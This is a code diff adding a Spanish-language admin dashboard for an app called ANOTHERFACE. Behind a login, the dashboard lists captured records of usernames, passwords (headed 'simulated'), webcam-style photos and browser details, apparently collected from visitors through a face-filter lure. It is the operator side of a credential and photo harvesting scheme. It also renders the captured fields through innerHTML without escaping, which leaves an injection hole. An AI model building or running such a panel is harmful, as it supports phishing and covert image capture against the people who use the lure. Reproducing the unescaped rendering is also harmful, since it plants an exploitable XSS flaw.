@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel - ANOTHERFACE</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    body { background-color: var(--bg); padding: 40px 20px; font-family: 'Space Grotesk', sans-serif; color: var(--text); }
+    .admin-container { max-width: 900px; margin: 0 auto; }
+    h1 { margin-bottom: 30px; text-align: center; color: var(--accent); }
+    .login-box { max-width: 400px; margin: 0 auto; background: var(--panel); padding: 30px; border-radius: 12px; border: 1px solid var(--line); }
+    .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid var(--line); background: var(--panel-2); color: white; }
+    .login-box button { width: 100%; }
+    .data-table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9rem; }
+    .data-table th, .data-table td { padding: 12px; text-align: left; border-bottom: 1px solid var(--line); }
+    .data-table th { color: var(--accent); background: var(--panel); }
+    .data-table img { max-width: 150px; border-radius: 8px; }
+    .hidden { display: none; }
+    .logout-btn { float: right; margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+
+<div class="admin-container">
+  <h1>Panel de Administración</h1>
+
+  <!-- Login Admin -->
+  <div id="admin-login" class="login-box">
+    <h3>Acceso Restringido</h3>
+    <form id="admin-form">
+      <input type="email" id="admin-email" placeholder="Correo electrónico" required>
+      <input type="password" id="admin-pwd" placeholder="Contraseña" required>
+      <button type="submit" class="btn btn-primary">Entrar</button>
+    </form>
+    <p id="admin-error" style="color: #ff4466; margin-top: 10px; display: none;">Credenciales incorrectas</p>
+  </div>
+
+  <!-- Dashboard Admin -->
+  <div id="admin-dashboard" class="hidden">
+    <button id="logout-btn" class="btn btn-ghost logout-btn">Cerrar Sesión</button>
+    <p>Mostrando los registros capturados (se eliminan automáticamente después de 4 horas).</p>
+    
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Fecha / Hora</th>
+          <th>Usuario (Simulado)</th>
+          <th>Contraseña (Simulada)</th>
+          <th>Filtro</th>
+          <th>Foto Capturada</th>
+          <th>Navegador</th>
+        </tr>
+      </thead>
+      <tbody id="data-body">
+        <!-- Datos cargados dinámicamente -->
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+  const loginSection = document.getElementById("admin-login");
+  const dashSection  = document.getElementById("admin-dashboard");
+  const loginForm    = document.getElementById("admin-form");
+  const dataBody     = document.getElementById("data-body");
+
+  // Check if already logged in
+  if (localStorage.getItem("admin_token")) {
+    showDashboard();
+  }
+
+  loginForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const email = document.getElementById("admin-email").value;
+    const password = document.getElementById("admin-pwd").value;
+
+    const res = await fetch("/api/admin/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    });
+
+    const data = await res.json();
+    if (data.success) {
+      localStorage.setItem("admin_token", data.token);
+      document.getElementById("admin-error").style.display = "none";
+      showDashboard();
+    } else {
+      document.getElementById("admin-error").style.display = "block";
+    }
+  });
+
+  document.getElementById("logout-btn").addEventListener("click", () => {
+    localStorage.removeItem("admin_token");
+    dashSection.classList.add("hidden");
+    loginSection.classList.remove("hidden");
+    loginForm.reset();
+  });
+
+  async function showDashboard() {
+    loginSection.classList.add("hidden");
+    dashSection.classList.remove("hidden");
+    
+    const token = localStorage.getItem("admin_token");
+    const res = await fetch("/api/admin/data", {
+      headers: { "Authorization": "Bearer " + token }
+    });
+    
+    if (res.status === 403 || res.status === 401) {
+      localStorage.removeItem("admin_token");
+      dashSection.classList.add("hidden");
+      loginSection.classList.remove("hidden");
+      return;
+    }
+
+    const json = await res.json();
+    if (json.success) {
+      renderTable(json.data);
+    } else {
+      dataBody.innerHTML = `<tr><td colspan="6">Error cargando datos: ${json.error}</td></tr>`;
+    }
+  }
+
+  function renderTable(rows) {
+    if (!rows || rows.length === 0) {
+      dataBody.innerHTML = `<tr><td colspan="6" style="text-align:center;">No hay registros recientes.</td></tr>`;
+      return;
+    }
+
+    dataBody.innerHTML = rows.map(r => {
+      const date = new Date(r.creado_en).toLocaleString("es-HN");
+      let photoHtml = "<i>Sin foto</i>";
+      
+      // Mostrar la imagen desde Storage si existe
+      if (r.imagen_url) {
+        photoHtml = `<a href="${r.imagen_url}" target="_blank"><img src="${r.imagen_url}" alt="Captura"></a>`;
+      } 
+      // Si no hay URL pero hay base64, mostrar el base64
+      else if (r.imagen_base64) {
+        photoHtml = `<img src="${r.imagen_base64}" alt="Captura">`;
+      }
+
+      return `
+        <tr>
+          <td>${date}</td>
+          <td>${r.usuario || '-'}</td>
+          <td>${r.contrasena || '-'}</td>
+          <td>${r.filtro || '-'}</td>
+          <td>${photoHtml}</td>
+          <td style="font-size:0.8rem; color: #888;">${r.navegador || '-'}</td>
+        </tr>
+      `;
+    }).join('');
+  }
+</script>
+</body>
+</html>
